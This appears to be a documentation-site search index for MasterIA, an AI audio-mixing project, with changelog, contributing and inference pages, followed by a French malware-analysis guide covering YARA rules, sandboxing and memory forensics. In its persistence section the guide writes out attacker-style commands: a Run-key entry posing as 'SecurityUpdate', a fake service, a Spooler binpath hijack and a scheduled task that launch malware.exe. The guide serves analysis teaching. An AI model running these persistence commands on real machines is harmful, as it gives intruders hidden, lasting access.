<li>Model_Training.ipynb: Model training experiments</li> <li>Documentation: Initial documentation structure</li> <li>Project overview and architecture</li> <li>Data format guidelines</li> <li>Basic usage instructions</li> <li>Testing: Unit test framework</li> <li>Test structure for all modules</li> <li>Continuous integration setup</li> </ul>"},{"location":"changelog/#technical-details","title":"Technical Details","text":"<ul> <li>Python Version: 3.8+ support</li> <li>Core Dependencies: NumPy, SciPy, LibROSA, scikit-learn, TensorFlow</li> <li>Audio Formats: WAV (primary), MP3, FLAC support</li> <li>Sample Rates: 44.1kHz, 48kHz, 96kHz</li> <li>Model Types: Random Forest, SVM, CNN ensemble</li> <li>Documentation: MkDocs with Material theme</li> </ul>"},{"location":"changelog/#001-2024-07-15","title":"[0.0.1] - 2024-07-15","text":""},{"location":"changelog/#added_3","title":"Added","text":"<ul> <li>Project Initialization: Repository setup and basic structure</li> <li>README with project description</li> <li>LICENSE file (MIT)</li> <li>Basic directory structure</li> <li>GitHub repository setup</li> <li>Initial Planning: Project roadmap and feature planning</li> <li>AI-based audio processing concept</li> <li>Machine learning approach design</li> <li>Data requirements definition</li> <li>Technical architecture planning</li> </ul>"},{"location":"changelog/#technical-specifications","title":"Technical Specifications","text":"<ul> <li>Target Platform: Python-based cross-platform solution</li> <li>Primary Focus: Hip-hop/rap music genre (expandable)</li> <li>AI Approach: Supervised learning with audio features</li> <li>Input Format: WAV files with metadata</li> <li>Output: Suggested effects and creative edits</li> </ul>"},{"location":"changelog/#version-history-summary","title":"Version History Summary","text":"Version Date Major Changes 0.2.0 2024-12-16 Complete documentation overhaul, enhanced features 0.1.0 2024-08-09 Initial working version with core functionality 0.0.1 2024-07-15 Project initialization and planning"},{"location":"changelog/#future-roadmap","title":"Future Roadmap","text":""},{"location":"changelog/#version-030-planned","title":"Version 0.3.0 (Planned)","text":"<ul> <li>Real-time audio processing capabilities</li> <li>Web-based user interface</li> <li>Advanced genre-specific models</li> <li>VST plugin integration</li> <li>Performance optimizations</li> </ul>"},{"location":"changelog/#version-040-planned","title":"Version 0.4.0 (Planned)","text":"<ul> <li>Cloud-based processing</li> <li>Mobile app support</li> <li>Advanced deep learning models</li> <li>Community features and sharing</li> <li>Professional studio integration</li> </ul>"},{"location":"changelog/#version-100-planned","title":"Version 1.0.0 (Planned)","text":"<ul> <li>Production-ready release</li> <li>Comprehensive testing and validation</li> <li>Commercial licensing options</li> <li>Professional support</li> <li>Enterprise features</li> </ul>"},{"location":"changelog/#contributing","title":"Contributing","text":"<p>We welcome contributions to MasterIA! Please see our Contributing Guidelines for details on how to:</p> <ul> <li>Report bugs and issues</li> <li>Suggest new features</li> <li>Submit code changes</li> <li>Improve documentation</li> <li>Add test cases</li> </ul>"},{"location":"changelog/#acknowledgments","title":"Acknowledgments","text":"<p>Special thanks to: - The open-source audio processing community - LibROSA developers for audio analysis tools - scikit-learn team for machine learning libraries - TensorFlow team for deep learning framework - All contributors and users who provide feedback</p> <p>For questions about specific versions or changes, please check the GitHub Issues or Discussions sections.</p>"},{"location":"ci_cd/","title":"Continuous Integration and Deployment","text":""},{"location":"ci_cd/#overview","title":"Overview","text":"<p>We use continuous integration (CI) to automatically test and deploy our project. This ensures that new changes do not break existing functionality and that our documentation is always up-to-date.</p>"},{"location":"ci_cd/#github-actions","title":"GitHub Actions","text":"<p>Our project is set up with GitHub Actions for CI/CD. The following workflows are defined:</p> <ul> <li>Test Workflow: Automatically runs the unit tests defined in the <code>tests/</code> directory.</li> <li>Documentation Deployment: Deploys the <code>mkdocs</code> documentation to GitHub Pages whenever changes are pushed to the <code>main</code> branch.</li> </ul>"},{"location":"ci_cd/#setting-up-cicd","title":"Setting Up CI/CD","text":"<ol> <li>Test Workflow:</li> <li>The test workflow runs <code>pytest</code> to execute all unit tests.</li> <li> <p>Ensure all tests pass before merging to <code>main</code>.</p> </li> <li> <p>Documentation Deployment:</p> </li> <li><code>mkdocs gh-deploy</code> is used to deploy the latest documentation to GitHub Pages.</li> </ol>"},{"location":"ci_cd/#workflow-files","title":"Workflow Files","text":"<p>You can find the CI workflow files in the <code>.github/workflows/</code> directory.</p> <p>For more details on setting up and customizing CI/CD workflows, refer to the GitHub Actions Documentation.</p>"},{"location":"contributing/","title":"Contributing to MasterIA","text":"<p>We welcome contributions to improve this project! Whether you want to report a bug, suggest an enhancement, submit code, or improve documentation, your help is appreciated.</p>"},{"location":"contributing/#how-to-contribute","title":"\ud83e\udd1d How to Contribute","text":""},{"location":"contributing/#1-fork-the-repository","title":"1. Fork the Repository","text":"<ul> <li>Fork the project on GitHub to your account</li> <li>Clone your fork locally:   <pre><code>git clone https://github.com/your-username/MasterIA.git\ncd MasterIA\n</code></pre></li> </ul>"},{"location":"contributing/#2-set-up-development-environment","title":"2. Set Up Development Environment","text":"<ul> <li> <p>Create a virtual environment:   <pre><code>python -m venv venv\nsource venv/bin/activate  # On Windows: venv\\Scripts\\activate\n</code></pre></p> </li> <li> <p>Install dependencies:   <pre><code>pip install -r requirements.txt\npip install -r requirements-dev.txt  # Development dependencies\n</code></pre></p> </li> </ul>"},{"location":"contributing/#3-create-a-new-branch","title":"3. Create a New Branch","text":"<ul> <li>Create a branch for your changes:   <pre><code>git checkout -b feature/my-feature\n# or\ngit checkout -b fix/bug-description\n# or\ngit checkout -b docs/documentation-update\n</code></pre></li> </ul>"},{"location":"contributing/#4-make-your-changes","title":"4. Make Your Changes","text":"<ul> <li>Implement your changes or additions</li> <li>Follow the coding standards (see below)</li> <li>Add tests for new functionality</li> <li>Update documentation if necessary</li> </ul>"},{"location":"contributing/#5-test-your-changes","title":"5. Test Your Changes","text":"<ul> <li> <p>Run the test suite:   <pre><code>pytest tests/\n</code></pre></p> </li> <li> <p>Run linting:   <pre><code>flake8 src/\nblack src/\n</code></pre></p> </li> <li> <p>Test documentation build:   <pre><code>mkdocs build\n</code></pre></p> </li> </ul>"},{"location":"contributing/#6-commit-and-push","title":"6. Commit and Push","text":"<ul> <li> <p>Stage your changes:   <pre><code>git add .\n</code></pre></p> </li> <li> <p>Commit with a descriptive message:   <pre><code>git commit -m \"Add feature: description of changes\"\n</code></pre></p> </li> <li> <p>Push to your fork:   <pre><code>git push origin feature/my-feature\n</code></pre></p> </li> </ul>"},{"location":"contributing/#7-create-a-pull-request","title":"7. Create a Pull Request","text":"<ul> <li>Go to the original repository on GitHub</li> <li>Click \"New Pull Request\"</li> <li>Select your branch and provide a clear description</li> <li>Reference any related issues</li> </ul>"},{"location":"contributing/#types-of-contributions","title":"\ud83d\udccb Types of Contributions","text":""},{"location":"contributing/#bug-reports","title":"\ud83d\udc1b Bug Reports","text":"<p>Help us improve by reporting bugs:</p> <p>Before reporting: - Check existing issues to avoid duplicates - Try the latest version - Test with minimal reproduction case</p> <p>Include in your report: - System information (OS, Python version, library versions) - Steps to reproduce the issue - Expected vs actual behavior - Error messages and stack traces - Sample audio files (if relevant)</p> <p>Template: <pre><code>## Bug Description\nBrief description of the issue\n\n## Steps to Reproduce\n1. Step one\n2. Step two\n3. Step three\n\n## Expected Behavior\nWhat should happen\n\n## Actual Behavior\nWhat actually happens\n\n## System Information\n- OS: [e.g., Ubuntu 20.04]\n- Python: [e.g., 3.8.5]\n- MasterIA: [e.g., 0.2.0]\n- Dependencies: [paste output of pip freeze]\n\n## Additional Context\nAny other relevant information\n</code></pre></p>"},{"location":"contributing/#feature-requests","title":"\ud83d\udca1 Feature Requests","text":"<p>Suggest new features or improvements:</p> <p>Before suggesting: - Check if the feature already exists - Search existing feature requests - Consider if it fits the project scope</p> <p>Include in your request: - Clear description of the feature - Use cases and benefits - Possible implementation approaches - Examples or mockups (if applicable)</p>"},{"location":"contributing/#code-contributions","title":"\ud83d\udd27 Code Contributions","text":"<p>Contribute code improvements:</p> <p>Types of code contributions: - Bug fixes - New features - Performance improvements - Code refactoring - Test improvements</p> <p>Guidelines: - Follow the existing code style - Add appropriate tests - Update documentation - Keep changes focused and atomic</p>"},{"location":"contributing/#documentation-contributions","title":"\ud83d\udcdd Documentation Contributions","text":"<p>Help improve documentation:</p> <p>Types of documentation: - API documentation - Usage examples - Tutorials and guides - README improvements - Code comments</p> <p>Guidelines: - Use clear, concise language - Include practical examples - Test all code examples - Follow existing documentation structure</p>"},{"location":"contributing/#coding-standards","title":"\ud83d\udccf Coding Standards","text":""},{"location":"contributing/#python-style-guide","title":"Python Style Guide","text":"<p>We follow PEP 8 with some modifications:</p> <ul> <li>Line length: 88 characters (Black default)</li> <li>Indentation: 4 spaces</li> <li>Quotes: Double quotes for strings</li> <li>Naming: snake_case for functions and variables</li> </ul>"},{"location":"contributing/#code-formatting","title":"Code Formatting","text":"<p>We use automated formatting tools:</p> <pre><code># Format code\nblack src/\n\n# Sort imports\nisort src/\n\n# Lint code\nflake8 src/\n</code></pre>"},{"location":"contributing/#docstring-format","title":"Docstring Format","text":"<p>Use Google-style docstrings:</p> <pre><code>def example_function(param1: str, param2: int) -&gt; bool:\n    \"\"\"Brief description of the function.\n\n    Longer description if needed. Explain what the function does,\n    its purpose, and any important details.\n\n    Args:\n        param1 (str): Description of the first parameter.\n        param2 (int): Description of the second parameter.\n\n    Returns:\n        bool: Description of the return value.\n\n    Raises:\n        ValueError: Description of when this exception is raised.\n\n    Example:\n        &gt;&gt;&gt; result = example_function(\"hello\", 42)\n        &gt;&gt;&gt; print(result)\n        True\n    \"\"\"\n    # Implementation here\n    return True\n</code></pre>"},{"location":"contributing/#testing-guidelines","title":"\ud83e\uddea Testing Guidelines","text":""},{"location":"contributing/#test-structure","title":"Test Structure","text":"<p>Organize tests to mirror the source structure:</p> <pre><code>tests/\n\u251c\u2500\u2500 test_data_processing.py\n\u251c\u2500\u2500 test_feature_extraction.py\n\u251c\u2500\u2500 test_model_training.py\n\u251c\u2500\u2500 test_inference.py\n\u2514\u2500\u2500 fixtures/\n    \u251c\u2500\u2500 sample_audio.wav\n    \u2514\u2500\u2500 sample_metadata.json\n</code></pre>"},{"location":"contributing/#writing-tests","title":"Writing Tests","text":"<p>Follow these patterns:</p> <pre><code>import pytest\nimport numpy as np\nfrom src.data_processing import load_audio_files\n\nclass TestDataProcessing:\n    \"\"\"Test cases for data processing module.\"\"\"\n\n    def test_load_audio_files_success(self):\n        \"\"\"Test successful loading of audio files.\"\"\"\n        # Arrange\n        directory = \"tests/fixtures/audio/\"\n\n        # Act\n        result = load_audio_files(directory)\n\n        # Assert\n        assert isinstance(result, dict)\n        assert len(result) &gt; 0\n        assert all(isinstance(audio, np.ndarray) for audio in result.values())\n</code></pre>"},{"location":"contributing/#documentation-guidelines","title":"\ud83d\udcda Documentation Guidelines","text":""},{"location":"contributing/#documentation-structure","title":"Documentation Structure","text":"<p>Follow this structure for new documentation:</p> <pre><code># Title\n\nBrief description of the topic.\n\n## Overview\nGeneral overview and context.\n\n## Usage\nBasic usage examples.\n\n## Examples\nPractical examples with code.\n\n## API Reference\nDetailed function/class documentation.\n</code></pre>"},{"location":"contributing/#code-examples","title":"Code Examples","text":"<p>Include working code examples:</p> <pre><code># Always include imports\nfrom src.data_processing import load_audio_files\n\n# Provide complete, runnable examples\naudio_data = load_audio_files(\"data/audio/\")\nprint(f\"Loaded {len(audio_data)} files\")\n</code></pre>"},{"location":"contributing/#development-workflow","title":"\ud83d\ude80 Development Workflow","text":""},{"location":"contributing/#setting-up-development-environment","title":"Setting Up Development Environment","text":"<ol> <li> <p>Clone and setup: <pre><code>git clone https://github.com/your-username/MasterIA.git\ncd MasterIA\npython -m venv venv\nsource venv/bin/activate\npip install -r requirements.txt\npip install -r requirements-dev.txt\n</code></pre></p> </li> <li> <p>Run tests to ensure everything works: <pre><code>pytest tests/\n</code></pre></p> </li> </ol>"},{"location":"contributing/#daily-development","title":"Daily Development","text":"<ol> <li> <p>Pull latest changes: <pre><code>git pull origin main\n</code></pre></p> </li> <li> <p>Create feature branch: <pre><code>git checkout -b feature/my-feature\n</code></pre></p> </li> <li> <p>Make changes and test: <pre><code># Make your changes\npytest tests/\nflake8 src/\nblack src/\n</code></pre></p> </li> <li> <p>Commit and push: <pre><code>git add .\ngit commit -m \"Add feature: description\"\ngit push origin feature/my-feature\n</code></pre></p> </li> </ol>"},{"location":"contributing/#performance-considerations","title":"\ud83d\udcca Performance Considerations","text":""},{"location":"contributing/#code-performance","title":"Code Performance","text":"<ul> <li>Profile code before optimizing</li> <li>Use appropriate data structures</li> <li>Minimize memory allocation</li> <li>Cache expensive computations</li> </ul>"},{"location":"contributing/#audio-processing-performance","title":"Audio Processing Performance","text":"<ul> <li>Process audio in chunks for large files</li> <li>Use efficient audio libraries (LibROSA, scipy)</li> <li>Consider parallel processing for batch operations</li> <li>Optimize feature extraction algorithms</li> </ul>"},{"location":"contributing/#ideas-for-contributions","title":"\ud83d\udca1 Ideas for Contributions","text":""},{"location":"contributing/#for-beginners","title":"For Beginners","text":"<ul> <li>Fix documentation typos</li> <li>Add code examples</li> <li>Improve error messages</li> <li>Add unit tests</li> <li>Update dependencies</li> </ul>"},{"location":"contributing/#for-experienced-developers","title":"For Experienced Developers","text":"<ul> <li>Implement new features</li> <li>Optimize performance</li> <li>Add advanced algorithms</li> <li>Improve architecture</li> <li>Add integration tests</li> </ul>"},{"location":"contributing/#for-domain-experts","title":"For Domain Experts","text":"<ul> <li>Improve audio processing algorithms</li> <li>Add new feature extraction methods</li> <li>Enhance model architectures</li> <li>Validate algorithm accuracy</li> <li>Add domain-specific optimizations</li> </ul>"},{"location":"contributing/#getting-help","title":"\ud83d\udcde Getting Help","text":""},{"location":"contributing/#development-questions","title":"Development Questions","text":"<ul> <li>GitHub Discussions: Ask questions about development</li> <li>Code Review: Request feedback on your changes</li> <li>Issue Tracker: See what others are working on</li> </ul>"},{"location":"contributing/#resources","title":"Resources","text":"<ul> <li>Project Documentation: Complete API and usage documentation</li> <li>Code Examples: Working examples in notebooks/</li> <li>Test Suite: Examples of how to test your code</li> </ul>"},{"location":"contributing/#recognition","title":"\ud83c\udfc6 Recognition","text":""},{"location":"contributing/#contributors","title":"Contributors","text":"<p>All contributors are recognized in: - GitHub contributors list - Release notes - Documentation credits - Project README</p>"},{"location":"contributing/#types-of-recognition","title":"Types of Recognition","text":"<ul> <li>Code Contributors: Direct code contributions</li> <li>Documentation Contributors: Documentation improvements</li> <li>Community Contributors: Help with issues and discussions</li> <li>Bug Reporters: Quality bug reports and testing</li> </ul>"},{"location":"contributing/#code-of-conduct","title":"\ud83d\udcdc Code of Conduct","text":""},{"location":"contributing/#our-pledge","title":"Our Pledge","text":"<p>We pledge to make participation in our project a harassment-free experience for everyone, regardless of background, experience level, or identity.</p>"},{"location":"contributing/#our-standards","title":"Our Standards","text":"<ul> <li>Be respectful and inclusive</li> <li>Provide constructive feedback</li> <li>Focus on what is best for the community</li> <li>Show empathy towards other contributors</li> </ul>"},{"location":"contributing/#enforcement","title":"Enforcement","text":"<p>Report any unacceptable behavior to the project maintainers. All complaints will be reviewed and investigated promptly.</p> <p>Thank you for contributing to MasterIA! Your contributions help make this project better for everyone. \ud83c\udfb5\ud83e\udd16</p>"},{"location":"data/","title":"Data Handling","text":""},{"location":"data/#data-structure","title":"Data Structure","text":"<p>The project works with audio data stored in a specific directory structure:</p> <ul> <li>Raw Data: Unprocessed audio files, typically in <code>.wav</code> format.</li> <li><code>data/raw/tracks/</code>: Contains folders for each track (e.g., <code>song1/</code>, <code>song2/</code>).</li> <li> <p>Example: <code>data/raw/tracks/song1/vocals.wav</code></p> </li> <li> <p>Processed Data: Feature files and preprocessed data ready for model input.</p> </li> <li><code>data/processed/features/</code>: Contains extracted features like MFCCs and spectrograms.</li> <li>Example: <code>data/processed/features/song1_vocals_mfcc.npy</code></li> </ul>"},{"location":"data/#data-collection","title":"Data Collection","text":"<ul> <li>Source Audio: Collect raw audio files for different tracks (vocals, instruments, etc.).</li> <li>Reference Tracks: Include mixed and mastered tracks for the AI to learn from.</li> </ul>"},{"location":"data/#data-processing-workflow","title":"Data Processing Workflow","text":"<ol> <li>Loading Audio:</li> <li> <p>Use the <code>load_audio()</code> function from <code>src/data_processing.py</code> to load audio files into numpy arrays.</p> </li> <li> <p>Splitting Tracks:</p> </li> <li> <p>Use the <code>split_tracks()</code> function to divide longer audio files into manageable segments.</p> </li> <li> <p>Feature Extraction:</p> </li> <li> <p>Use <code>extract_mfcc()</code> and <code>extract_spectrogram()</code> from <code>src/feature_extraction.py</code> to extract features for model training.</p> </li> <li> <p>Saving Processed Data:</p> </li> <li>Save extracted features as <code>.npy</code> files in the <code>data/processed/features/</code> directory.</li> </ol> <p>Ensure your data is properly organized before starting model training.</p>"},{"location":"inference/","title":"Inference Script Documentation","text":""},{"location":"inference/#overview","title":"Overview","text":"<p>The <code>inference.py</code> script is designed to perform inference on new audio data using a pre-trained machine learning model. It suggests actions and creative cuts to be applied to the audio tracks.</p>"},{"location":"inference/#functions","title":"Functions","text":""},{"location":"inference/#load_modelmodel_path","title":"<code>load_model(model_path)</code>","text":"<ul> <li>Description: Loads the pre-trained machine learning model from the specified path.</li> <li>Arguments:</li> <li><code>model_path</code> (str): Path to the model file.</li> <li>Returns: The loaded model.</li> </ul>"},{"location":"inference/#predict_actionsmodel-audio_data","title":"<code>predict_actions(model, audio_data)</code>","text":"<ul> <li>Description: Predicts the actions and cuts for the given audio data using the pre-trained model.</li> <li>Arguments:</li> <li><code>model</code>: The pre-trained machine learning model.</li> <li><code>audio_data</code> (dict): Dictionary where keys are filenames and values are audio data.</li> <li>Returns: A dictionary with suggested actions and cuts for each audio file.</li> </ul>"},{"location":"inference/#run_inferencemodel_path-audio_data","title":"<code>run_inference(model_path, audio_data)</code>","text":"<ul> <li>Description: The main function that runs the inference process. It loads the model, predicts the actions, and returns the results.</li> <li>Arguments:</li> <li><code>model_path</code> (str): Path to the pre-trained model file.</li> <li><code>audio_data</code> (dict): Dictionary where keys are filenames and values are audio data.</li> <li>Returns: A dictionary with suggested actions and cuts for each audio file.</li> </ul>"},{"location":"inference/#usage","title":"Usage","text":"<p>```bash python inference.py --model_path \"path/to/saved/model.pkl\" --audio_data \"path/to/audio/files\"</p>"},{"location":"malware-analysis/","title":"D\u00e9tection et Analyse de Malwares","text":""},{"location":"malware-analysis/#detection-et-analyse-de-malwares-identification-des-menaces","title":"D\u00e9tection et Analyse de Malwares - Identification des menaces","text":""},{"location":"malware-analysis/#vue-densemble-de-lanalyse-de-malwares","title":"Vue d'ensemble de l'analyse de malwares","text":"<p>L'analyse de malwares est un processus syst\u00e9matique d'examen des logiciels malveillants pour comprendre leurs fonctionnalit\u00e9s, leur comportement et leurs m\u00e9canismes d'infection.</p>"},{"location":"malware-analysis/#types-danalyse","title":"Types d'analyse","text":"<p>Analyse statique - Examen du code sans ex\u00e9cution - Analyse des imports/exports - D\u00e9tection de packers/crypters - Analyse des strings</p> <p>Analyse dynamique - Ex\u00e9cution en environnement contr\u00f4l\u00e9 - Monitoring du comportement - Analyse des modifications syst\u00e8me - Monitoring r\u00e9seau</p> <p>Analyse hybride - Combinaison des deux approches - Corr\u00e9lation des r\u00e9sultats - Analyse approfondie</p>"},{"location":"malware-analysis/#signatures-et-heuristiques","title":"Signatures et heuristiques","text":""},{"location":"malware-analysis/#signatures-basees-sur-les-hashes","title":"Signatures bas\u00e9es sur les hashes","text":"<p>MD5/SHA1/SHA256 <pre><code># Calcul des hashes\nmd5sum malware.exe\nsha1sum malware.exe\nsha256sum malware.exe\n\n# V\u00e9rification base de donn\u00e9es\npython virustotal_check.py --hash a1b2c3d4e5f6...\n</code></pre></p> <p>Hashes fuzzy (ssdeep) <pre><code># Calcul ssdeep\nssdeep malware.exe\n\n# Comparaison avec base de donn\u00e9es\nssdeep -m database.txt malware.exe\n</code></pre></p> <p>Import Hash (imphash) <pre><code>import pefile\n\npe = pefile.PE('malware.exe')\nimphash = pe.get_imphash()\nprint(f\"Import Hash: {imphash}\")\n</code></pre></p>"},{"location":"malware-analysis/#signatures-yara","title":"Signatures YARA","text":"<p>R\u00e8gle basique <pre><code>rule Basic_Malware_Detection\n{\n    meta:\n        description = \"D\u00e9tection de malware basique\"\n        author = \"Analyst\"\n        date = \"2024-01-15\"\n\n    strings:\n        $api1 = \"CreateRemoteThread\"\n        $api2 = \"VirtualAllocEx\"\n        $api3 = \"WriteProcessMemory\"\n        $string1 = \"malware\" nocase\n\n    condition:\n        all of ($api*) or $string1\n}\n</code></pre></p> <p>R\u00e8gle avanc\u00e9e <pre><code>rule Advanced_Packer_Detection\n{\n    meta:\n        description = \"D\u00e9tection de packer avanc\u00e9\"\n\n    strings:\n        $mz = { 4D 5A }\n        $pe = { 50 45 00 00 }\n        $upx1 = { 55 50 58 30 }\n        $upx2 = { 55 50 58 31 }\n\n    condition:\n        $mz at 0 and $pe and any of ($upx*)\n}\n</code></pre></p>"},{"location":"malware-analysis/#heuristiques-comportementales","title":"Heuristiques comportementales","text":"<p>Techniques de d\u00e9tection - Analyse des API calls - Monitoring des modifications syst\u00e8me - D\u00e9tection d'injection de code - Analyse des communications r\u00e9seau</p> <p>Indicateurs comportementaux <pre><code># Pseudo-code d'analyse heuristique\ndef analyze_behavior(executable):\n    score = 0\n\n    # APIs suspectes\n    if 'CreateRemoteThread' in executable.imports:\n        score += 10\n    if 'VirtualAllocEx' in executable.imports:\n        score += 10\n    if 'SetWindowsHookEx' in executable.imports:\n        score += 8\n\n    # Sections suspectes\n    if executable.has_packed_sections():\n        score += 15\n\n    # Entropy \u00e9lev\u00e9e\n    if executable.entropy &gt; 7.5:\n        score += 12\n\n    return score\n</code></pre></p>"},{"location":"malware-analysis/#analyse-comportementale","title":"Analyse comportementale","text":""},{"location":"malware-analysis/#sandbox-automatisee","title":"Sandbox automatis\u00e9e","text":"<p>Cuckoo Sandbox <pre><code># Installation\ngit clone https://github.com/cuckoosandbox/cuckoo\ncd cuckoo\npip install -r requirements.txt\n\n# Configuration\ncuckoo init\ncuckoo community\n\n# Soumission d'\u00e9chantillon\ncuckoo submit malware.exe\n</code></pre></p> <p>Configuration Cuckoo <pre><code># cuckoo.conf\n[cuckoo]\nmachinery = virtualbox\nmemory_dump = yes\nterminate_processes = yes\nmax_analysis_count = 0\n\n[processing]\nenable_screenshots = yes\nenable_procmon = yes\nenable_networkmon = yes\n</code></pre></p>"},{"location":"malware-analysis/#analyse-manuelle-en-vm","title":"Analyse manuelle en VM","text":"<p>Pr\u00e9paration de l'environnement <pre><code># Outils de monitoring\n- Process Monitor (ProcMon)\n- Process Explorer\n- Wireshark\n- Regshot\n- API Monitor\n\n# Snapshot avant analyse\nVBoxManage snapshot \"Analysis-VM\" take \"Clean-State\"\n</code></pre></p> <p>Proc\u00e9dure d'analyse 1. Snapshot initial de la VM 2. D\u00e9marrage des outils de monitoring 3. Ex\u00e9cution du malware 4. Observation du comportement 5. Collecte des artefacts 6. Restauration du snapshot</p>"},{"location":"malware-analysis/#monitoring-systeme","title":"Monitoring syst\u00e8me","text":"<p>Process Monitor <pre><code># Configuration des filtres\n- Process and Thread Activity\n- File and Directory Activity\n- Registry Activity\n- Network Activity\n</code></pre></p> <p>Registry monitoring <pre><code># Avant ex\u00e9cution\nreg export HKLM\\SOFTWARE before_software.reg\nreg export HKLM\\SYSTEM before_system.reg\n\n# Apr\u00e8s ex\u00e9cution\nreg export HKLM\\SOFTWARE after_software.reg\nreg export HKLM\\SYSTEM after_system.reg\n\n# Comparaison\nfc before_software.reg after_software.reg &gt; registry_changes.txt\n</code></pre></p>"},{"location":"malware-analysis/#reverse-engineering-de-base","title":"Reverse engineering de base","text":""},{"location":"malware-analysis/#analyse-statique","title":"Analyse statique","text":"<p>Outils principaux - IDA Pro : D\u00e9sassembleur professionnel - Ghidra : Outil NSA open source - x64dbg : D\u00e9bogueur Windows - PE-bear : Analyseur PE</p> <p>Analyse PE <pre><code>import pefile\n\npe = pefile.PE('malware.exe')\n\n# Informations de base\nprint(f\"Entry Point: 0x{pe.OPTIONAL_HEADER.AddressOfEntryPoint:x}\")\nprint(f\"Image Base: 0x{pe.OPTIONAL_HEADER.ImageBase:x}\")\nprint(f\"Sections: {pe.FILE_HEADER.NumberOfSections}\")\n\n# Imports\nfor entry in pe.DIRECTORY_ENTRY_IMPORT:\n    print(f\"DLL: {entry.dll.decode()}\")\n    for imp in entry.imports:\n        print(f\"  {imp.name.decode()}\")\n\n# Strings\nstrings = pe.get_strings()\nfor s in strings:\n    if len(s) &gt; 4:\n        print(s)\n</code></pre></p>"},{"location":"malware-analysis/#analyse-dynamique","title":"Analyse dynamique","text":"<p>D\u00e9bogage avec x64dbg <pre><code># Points d'arr\u00eat sur APIs critiques\nbp CreateProcess\nbp RegSetValue\nbp CreateFile\nbp InternetOpen\n\n# Analyse du flux d'ex\u00e9cution\nF9  # Run\nF8  # Step Over\nF7  # Step Into\n</code></pre></p> <p>API Hooking <pre><code># Detours API Hooking\nimport detours\n\ndef hooked_createfile(filename, access, share, security, creation, flags, template):\n    print(f\"CreateFile called: {filename}\")\n    return original_createfile(filename, access, share, security, creation, flags, template)\n\ndetours.hook(\"kernel32.dll\", \"CreateFileW\", hooked_createfile)\n</code></pre></p>"},{"location":"malware-analysis/#outils-danalyse-statique-et-dynamique","title":"Outils d'analyse statique et dynamique","text":""},{"location":"malware-analysis/#analyse-statique_1","title":"Analyse statique","text":"<p>PEiD <pre><code># D\u00e9tection de packers\nPEiD.exe malware.exe\n\n# Signatures communes\n- UPX\n- ASPack\n- Themida\n- VMProtect\n</code></pre></p> <p>Strings analysis <pre><code># Extraction des strings\nstrings malware.exe &gt; strings.txt\n\n# Filtrage des URLs\ngrep -i \"http\" strings.txt\n\n# Filtrage des IPs\ngrep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" strings.txt\n\n# Filtrage des registry keys\ngrep -i \"hklm\\|hkcu\" strings.txt\n</code></pre></p> <p>Entropy analysis <pre><code>import math\nfrom collections import Counter\n\ndef calculate_entropy(data):\n    counter = Counter(data)\n    length = len(data)\n    entropy = 0\n\n    for count in counter.values():\n        p = count / length\n        entropy -= p * math.log2(p)\n\n    return entropy\n\n# Calcul de l'entropie par section\nfor section in pe.sections:\n    entropy = calculate_entropy(section.get_data())\n    print(f\"Section {section.Name.decode()}: {entropy:.2f}\")\n</code></pre></p>"},{"location":"malware-analysis/#analyse-dynamique_1","title":"Analyse dynamique","text":"<p>Wireshark <pre><code># Filtres pour analyse malware\nip.addr == 192.168.1.100  # IP de la VM\nhttp.request.method == POST\ndns.qry.name contains \"malware\"\ntcp.port == 80 or tcp.port == 443\n</code></pre></p> <p>Volatility <pre><code># Analyse m\u00e9moire\nvolatility -f memory.dump --profile=Win10x64 pslist\nvolatility -f memory.dump --profile=Win10x64 netscan\nvolatility -f memory.dump --profile=Win10x64 malfind\nvolatility -f memory.dump --profile=Win10x64 hollowfind\n</code></pre></p> <p>Sysinternals Suite <pre><code># Process Explorer\nprocexp.exe\n\n# Autoruns\nautorunsc.exe -a &gt; autoruns.txt\n\n# TCPView\ntcpview.exe\n\n# Handle\nhandle.exe -p malware.exe\n</code></pre></p>"},{"location":"malware-analysis/#persistance-et-steganographie-techniques-devasion","title":"Persistance et Steganographie - Techniques d'\u00e9vasion","text":""},{"location":"malware-analysis/#mecanismes-de-persistence-windows","title":"M\u00e9canismes de persistence Windows","text":""},{"location":"malware-analysis/#registre-windows","title":"Registre Windows","text":"<p>Cl\u00e9s de d\u00e9marrage automatique <pre><code># Current User\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\n\n# Local Machine\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\n</code></pre></p> <p>Exemple d'installation <pre><code># Ajout d'une entr\u00e9e de persistance\nreg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SecurityUpdate\" /t REG_SZ /d \"C:\\Windows\\Temp\\malware.exe\" /f\n\n# V\u00e9rification\nreg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\n</code></pre></p>"},{"location":"malware-analysis/#services-windows","title":"Services Windows","text":"<p>Cr\u00e9ation de service <pre><code># Cr\u00e9ation d'un service persistant\nsc create \"WindowsSecurityService\" binpath= \"C:\\Windows\\System32\\malware.exe\" start= auto displayname= \"Windows Security Service\"\n\n# D\u00e9marrage du service\nsc start \"WindowsSecurityService\"\n\n# Modification d'un service existant\nsc config \"Spooler\" binpath= \"C:\\Windows\\System32\\malware.exe\"\n</code></pre></p> <p>Analyse des services <pre><code># Liste des services\nsc query type= service state= all\n\n# D\u00e9tail d'un service\nsc qc \"WindowsSecurityService\"\n\n# V\u00e9rification des binaires\nGet-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike \"*system32*\"} | Select-Object Name, PathName\n</code></pre></p>"},{"location":"malware-analysis/#scheduled-tasks","title":"Scheduled Tasks","text":"<p>Cr\u00e9ation de t\u00e2ches <pre><code># T\u00e2che simple\nschtasks /create /tn \"SystemUpdate\" /tr \"C:\\Windows\\Temp\\malware.exe\" /sc daily /st 09:00\n\n# T\u00e2che avanc\u00e9e avec XML\nschtasks /create /tn \"SecurityCheck\" /xml task.xml\n</code></pre></p> <p>Fichier XML de t\u00e2che <pre><code>&lt;?xml 